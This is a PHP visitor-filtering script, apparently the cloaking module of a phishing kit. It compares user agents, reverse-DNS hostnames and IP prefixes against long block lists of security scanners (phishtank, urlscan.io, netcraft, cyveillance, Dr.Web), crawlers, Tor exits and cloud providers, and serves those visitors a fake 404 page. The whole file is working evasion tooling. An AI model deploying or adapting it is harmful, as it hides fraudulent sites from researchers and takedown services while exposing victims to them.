<?php
$agent = $_SERVER['HTTP_USER_AGENT'];
$blocked_wordss = array("Googlebot","(X11;","(compatible;","Unknown;","kontera","Python",);
foreach($blocked_wordss as $word) {
    if (substr_count($agent, $word) > 0) {
        header("HTTP/1.0 404 Not Found");
die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }
}



$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array("drweb",
"Dr.Web",
"ukservers",
"postmail",
"136.228.201.71",
"2.58.29.27",
"165.225.38.90",
"67.137.36.66",
"38.140.169.18",
"2442ob.scansafe.net",
"scansafe.net",
"146.112.248.226",
"199.116.168.87",
"199.116.169.254",
"146.112.248.229",
"95.76.39.109",
"172.58.19.121",
"37.221.112.107",
"65.154.226.109",
"157.55.169.185",
"170.55.73.199",
"172.58.11.81",
"107.242.117.25",
"74.213.81.28",
"172.58.60.41",
"172.58.45.87",
"69.25.58.61",
"38.108.182.2",
"196.251.250.157",
"80.82.66.250",
"65.154.226.220",
"8.47.69.178",
"181.215.77.43",
"72.12.194.93",
"72.12.194.92",
"72.12.194.94",
"72.12.194.90",
"172.58.22.164",
"172.58.102.163",
"113.210.51.192",
"172.58.59.52",
"172.58.19.66",
"172.58.19.8",
"77.243.191.38",
"89.238.135.139",
"165.227.81.246",
"87-89-48-69.abo.bbox.fr",
"bbox.fr",
"ue.tmodns.net",
"gigenet.com",
"static.51.46.217.95.clients.your-server.de",
"r-62-250-251-196.consumer-pool.prcdn.net",
"prcdn.net",
"your-server.de",
"46.0.32.70.hosted.by.gigenet.com",
"unn-89-187-178-212.cdn77.com",
"cdn77.com",
"mail.mikescamera.com",
"external-02-dev.vie.plob.cz",
"pc-199-83-241-201.cm.vtr.net",
"vtr.net",
"plob.cz",
"host9773003284.direcway.com",
"c10-91.tlh.ro",
"sl-reverse.com",
"aruba",
"hostinger",
"dmrcom",
"scanurl",
"urlscan.io",
"fwdproxy-atn-056.fbsv.net",
"fwdproxy-ftw-013.fbsv.net",
"fwdproxy-vll-008.fbsv.net",
"fwdproxy-atn-021.fbsv.net",
"fwdproxy-atn-050.fbsv.net",
"fwdproxy-atn-029.fbsv.net",
"fwdproxy-ftw-036.fbsv.net",
"fwdproxy-ash-052.fbsv.net",
"fbsv.net",
"fwdproxy",
"emailer1-103.thinins.net",
"thinins.net",
"69.164.111.198",
"numismatist.bothincrease.net",
"bothincrease.net",
"redcom",
"above",
"google",
"facebook",
"softlayer",
"amazonaws",
"amazon",
"tor",
"as9105",
"ip-164-132-51",
"nwstack",
"amsterdamresidential",
"poneytelecom.",
"outfall",
"slashsrv",
"as13285",
"activepenguin",
"vsnl",
"coldhak",
"cyveillance",
"phishtank",
"dreamhost",
"netpilot",
"novanthealth",
"embarqhsd",
"calyxinstitute",
"tor-exit",
"linode",
"yandex",
"baidu",
"msn",
"promobit",
"ertelecom",
"netcraft",
"phpnet",
"corbina",
"datapacket",
"factioninc.com",
"chtrptr",
".eu",
"oignons",
"lusfiber",
"plus.net",
"time-host",
"hwccustomers.com",
"melbi",
"kontera",
"teledata-fttx.de",
"googleusercontent",
"absdatasystems");
foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
        header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }
}

$userip = $_SERVER['REMOTE_ADDR'];
$blockedip = array("108.162.219.245","185.233.","35.237.","172.56.","151.80.","23.92.","194.187.","170.250.","45.56.","87.114.","162.158.78.35","162.158.106.223","172.68.46.60","173.245.52.170","162.158.63.71","162.158.79.30","162.158.63.221","46.101.","162.243.","91.103.","148.64.","72.21.","23.100.","23.105.","37.252.","45.74.","81.174.","106.11.","124.218.","139.59.","173.239.","180.179.","185.220.","185.201.","198.148.","204.101.","208.80.","208.91.","216.252.","180.15.","209.58.","138.197.","42.236.","199.16.","162.159","5.165.","194.72.","195.144.","95.30.","194.59.","199.19.","118.219.","178.32.","185.127.","46.173.","82.102.","47.206.","91.192.","87.112.","185.17.","158.255.","193.169.","173.205.","158.255.","188.166.","5.62.","185.124.","83.31.","185.234.","169.56.","158.177.","193.128.","208.87.","212.62.");
foreach($blockedip as $bip) {
if (substr_count($userip, $bip) > 0) {
header("HTTP/1.0 404 Not Found");
die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }

}

?>
